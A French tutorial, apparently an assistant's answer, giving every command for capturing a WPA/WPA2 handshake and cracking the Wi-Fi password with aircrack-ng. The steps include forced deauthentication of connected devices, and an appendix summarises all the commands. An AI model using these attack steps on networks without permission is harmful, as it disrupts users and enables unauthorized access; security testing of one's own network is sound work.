### Tutoriel détaillé : Piratage de mot de passe Wi-Fi avec Kali Linux

#### Introduction
Ce tutoriel couvre de manière exhaustive les étapes pour pirater un mot de passe Wi-Fi en utilisant Kali Linux. Notez que cela doit être fait uniquement sur des réseaux pour lesquels vous avez une autorisation explicite.

#### Prérequis
1. **Kali Linux**
   - [Télécharger Kali Linux](https://zsecurity.org/download-custom-kali/)
   - [Installer Kali Linux sur VMware](https://www.vmware.com/products/workstation-player.html)

2. **Adaptateur sans fil compatible injection de paquets**
   - Exemple : Alfa AWUS036ACH

3. **Outils nécessaires**
   - aircrack-ng suite
   - ifconfig
   - airmon-ng
   - airodump-ng
   - aireplay-ng

#### Étapes détaillées

1. **Préparation de l'environnement**

   1.1 **Démarrer Kali Linux**
   - Ouvrez VMware et démarrez votre machine virtuelle Kali Linux.

   1.2 **Ouvrir la ligne de commande**
   - Lancez un terminal en cliquant sur l'icône de terminal ou en utilisant le raccourci `Ctrl+Alt+T`.

2. **Configurer l'adaptateur sans fil**

   2.1 **Vérifier la disponibilité de l'adaptateur sans fil**
   ```bash
   ifconfig
   ```
   - Notez l'interface correspondant à votre adaptateur sans fil (généralement `wlan0`).

   2.2 **Activer le mode moniteur**
   ```bash
   airmon-ng start wlan0
   ```
   - Remplacez `wlan0` par votre interface sans fil.
   - Vérifiez que le mode moniteur est activé en exécutant `ifconfig` à nouveau. Vous devriez voir une nouvelle interface (généralement `wlan0mon`).

3. **Scanner les réseaux Wi-Fi**

   3.1 **Lister les réseaux Wi-Fi disponibles**
   ```bash
   airodump-ng wlan0mon
   ```
   - Prenez note du BSSID et du canal (CH) du réseau cible.

4. **Capturer les paquets**

   4.1 **Commencer la capture des paquets du réseau cible**
   ```bash
   airodump-ng -c [channel] --bssid [BSSID] -w [output_file] wlan0mon
   ```
   - Remplacez `[channel]` par le canal du réseau cible.
   - Remplacez `[BSSID]` par le BSSID du réseau cible.
   - Remplacez `[output_file]` par le nom de fichier de sortie souhaité.

5. **Déauthentifier un appareil du réseau**

   5.1 **Forcer la déauthentification pour capturer le handshake**
   ```bash
   aireplay-ng --deauth 10 -a [BSSID] wlan0mon
   ```
   - Remplacez `[BSSID]` par le BSSID du réseau cible.
   - Cette commande envoie des paquets de déauthentification pour forcer un appareil à se reconnecter.

6. **Vérifier la capture du handshake**

   6.1 **Analyser les paquets capturés pour vérifier la présence du handshake**
   ```bash
   aircrack-ng [output_file].cap
   ```
   - Remplacez `[output_file]` par le nom de fichier de sortie précédemment spécifié.
   - Si le handshake est capturé, vous verrez un message indiquant la capture réussie.

7. **Craquer le mot de passe**

   7.1 **Utiliser un fichier de mots de passe pour craquer le handshake capturé**
   ```bash
   aircrack-ng -w [wordlist] -b [BSSID] [output_file].cap
   ```
   - Remplacez `[wordlist]` par le chemin vers votre fichier de mots de passe (ex. : `/home/user/wordlist.txt`).
   - Remplacez `[BSSID]` par le BSSID du réseau cible.
   - Remplacez `[output_file]` par le nom de fichier de sortie.

#### Détails supplémentaires

1. **Installation de l'adaptateur sans fil**

   - **Télécharger et installer les pilotes** : Certains adaptateurs nécessitent des pilotes spécifiques. Suivez les instructions de [ce lien](https://adam-toscher.medium.com/configure-your-new-wireless-ac-1fb65c6ada57) pour configurer votre adaptateur.

2. **Gestion des interfaces réseau**

   - **Désactiver les services interférents** : Avant de démarrer le mode moniteur, il peut être nécessaire de désactiver certains services pour éviter les conflits.
   ```bash
   airmon-ng check kill
   ```

3. **Optimisation de la capture**

   - **Utiliser plusieurs canaux** : Si vous ne connaissez pas le canal exact, vous pouvez utiliser l'option `--channel` pour scanner plusieurs canaux.

4. **Utilisation de WPA/WPA2-PSK**

   - **Les handshakes WPA/WPA2** : Les réseaux protégés par WPA/WPA2 utilisent des handshakes qui peuvent être capturés et craqués si un mot de passe faible est utilisé.

5. **Gestion des erreurs courantes**

   - **Interface non détectée** : Assurez-vous que votre adaptateur est bien branché et reconnu par le système.
   - **Pas de handshake capturé** : Réessayez la déauthentification plusieurs fois ou vérifiez si le réseau cible utilise un système de protection plus robuste.

#### Conclusion
En suivant ces étapes détaillées, vous pouvez tester la sécurité de vos propres réseaux Wi-Fi de manière éthique. Utilisez toujours ces techniques de manière responsable et légale. 

Pour toute question supplémentaire ou besoin de clarification, n'hésitez pas à demander.


# Annexe 

### Résumé des Commandes pour Pirater un Mot de Passe Wi-Fi

1. **Vérifier l'adaptateur sans fil**
   ```bash
   ifconfig
   ```

2. **Activer le mode moniteur**
   ```bash
   airmon-ng start wlan0
   ```

3. **Lister les réseaux Wi-Fi disponibles**
   ```bash
   airodump-ng wlan0mon
   ```

4. **Capturer les paquets du réseau cible**
   ```bash
   airodump-ng -c [channel] --bssid [BSSID] -w [output_file] wlan0mon
   ```

5. **Déauthentifier un appareil du réseau**
   ```bash
   aireplay-ng --deauth 10 -a [BSSID] wlan0mon
   ```

6. **Vérifier la capture du handshake**
   ```bash
   aircrack-ng [output_file].cap
   ```

7. **Craquer le mot de passe avec un fichier de mots de passe**
   ```bash
   aircrack-ng -w [wordlist] -b [BSSID] [output_file].cap
   ```

Remplacez les termes entre crochets `[ ]` par les valeurs appropriées :
- `[channel]` : Canal du réseau cible.
- `[BSSID]` : BSSID du réseau cible.
- `[output_file]` : Nom du fichier de sortie pour la capture des paquets.
- `[wordlist]` : Chemin vers votre fichier de mots de passe.
